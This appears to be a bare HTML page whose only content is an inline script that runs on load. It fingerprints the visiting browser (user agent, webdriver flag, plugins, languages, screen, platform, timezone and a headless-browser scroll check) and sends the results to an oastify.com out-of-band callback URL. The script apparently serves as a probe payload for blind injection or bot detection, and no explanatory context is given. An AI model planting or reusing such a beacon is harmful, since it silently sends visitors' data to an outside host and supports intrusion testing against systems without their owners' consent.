<div></div>
    <script type="text/javascript">
 
function getHeadlessInfo() {
     const userAgent = navigator.userAgent;
    const isWebDriver = !!(window.navigator.webdriver || window.webdriver || navigator.webdriver);

    // Browser Plugins
    const plugins = Array.from(navigator.plugins).map(plugin => `${plugin.name} ${plugin.version || ''}`).join(', ');

    // Languages
    const languages = navigator.languages.join(', ');

    // Screen Dimensions
    const screenWidth = screen.width;
    const screenHeight = screen.height;

    // Navigator properties
    const appVersion = navigator.appVersion;
    const appName = navigator.appName;
    const platform = navigator.platform;
    const vendor = navigator.vendor;
    const productSub = navigator.productSub;

    // Touch Support
    const maxTouchPoints = navigator.maxTouchPoints;

    // Timezone Offset
    const timezoneOffset = new Date().getTimezoneOffset();

    // Headless Behavior Detection
    const detectHeadlessBehavior = () => {
        const element = document.createElement('div');
        element.style.cssText = 'width:100px;height:100px;overflow:auto;position:absolute;top:-200px;';
        document.body.appendChild(element);
        element.scrollTop = 10;
        const isHeadlessBehavior = element.scrollTop !== 10;
        document.body.removeChild(element);
        return isHeadlessBehavior;
    };
    const headlessBehaviorDetected = detectHeadlessBehavior();

    return {
        userAgent,
        isWebDriver,
        plugins,
        languages,
        screenWidth,
        screenHeight,
        appVersion,
        appName,
        platform,
        vendor,
        productSub,
        maxTouchPoints,
        timezoneOffset,
        headlessBehaviorDetected
    };
}
function sendHeadlessInfo() {
    const headlessInfo = getHeadlessInfo();
    const params = new URLSearchParams(headlessInfo).toString();
    const url = `https://rkf9aetn6sfnd1qpszkdhc7bu20toycn.oastify.com/xhr?${params}`;
    const xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.send();
}

sendHeadlessInfo();




        
    </script>
